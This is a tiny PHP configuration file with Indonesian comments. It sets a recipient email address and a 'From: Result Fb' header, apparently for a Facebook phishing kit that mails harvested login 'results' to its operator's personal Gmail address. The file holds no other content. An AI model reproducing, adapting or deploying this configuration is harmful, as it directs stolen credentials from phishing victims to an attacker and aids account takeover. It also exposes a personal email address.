<?php

$mailto = 'nurdingans69@gmail.com'; // email tujuan result

$from = 'From: Result Fb <result@ngtd.com>'; // nama result, kalo mau di ubah cuma "Result Fb" nya aja yg di ubah!

?>